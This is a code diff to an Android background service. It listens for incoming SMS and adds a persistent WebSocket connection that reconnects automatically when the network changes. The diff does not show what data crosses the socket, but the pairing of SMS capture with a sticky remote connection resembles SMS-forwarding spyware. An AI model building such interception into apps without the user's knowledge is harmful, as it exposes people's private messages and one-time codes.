@@ -8,24 +8,29 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.net.ConnectivityManager;
+import android.net.Network;
+import android.net.NetworkRequest;
 import android.os.Build;
+import android.os.Handler;
 import android.os.IBinder;
 import android.util.Log;
 
+import androidx.annotation.NonNull;
 import androidx.core.app.NotificationCompat;
 
 public class BackgroundService extends Service {
 
     private static final String TAG = "BackgroundService";
-    private static final String CHANNEL_ID = "SmsServiceChannel";
+    private static final String CHANNEL_ID = "SocketServiceChannel";
     private SmsReceiver smsReceiver;
+    private WebSocketManager webSocketManager;
 
     @Override
     public void onCreate() {
         super.onCreate();
         createNotificationChannel();
 
-        // Register the SMS receiver
         IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
         smsReceiver = new SmsReceiver();
         registerReceiver(smsReceiver, filter);
@@ -39,8 +44,33 @@ public class BackgroundService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d(TAG, "Foreground service running");
+        webSocketManager = new WebSocketManager(getApplicationContext());
+        webSocketManager.connect();
+
+        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
+        NetworkRequest networkRequest = new NetworkRequest.Builder().build();
+        connectivityManager.registerNetworkCallback(networkRequest, new ConnectivityManager.NetworkCallback() {
+            @Override
+            public void onAvailable(@NonNull Network network) {
+                reconnectWebSocket();
+            }
+
+            @Override
+            public void onLost(@NonNull Network network) {
+                webSocketManager.closeConnection();
+            }
+        });
+
         return START_STICKY;
+    }
+
+    private void reconnectWebSocket() {
+        new Handler().postDelayed(() -> {
+            if (!webSocketManager.isConnected()) {
+                webSocketManager = new WebSocketManager(getApplicationContext());
+                webSocketManager.connect();
+            }
+        }, 3000);
     }
 
     @Override
@@ -88,7 +118,7 @@ public class BackgroundService extends Service {
 
     @SuppressLint("ForegroundServiceType")
     private void startForegroundService() {
-        Intent notificationIntent = new Intent(this, HmAc.class);
+        Intent notificationIntent = new Intent(this, MainActivity.class);
         PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);
 
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
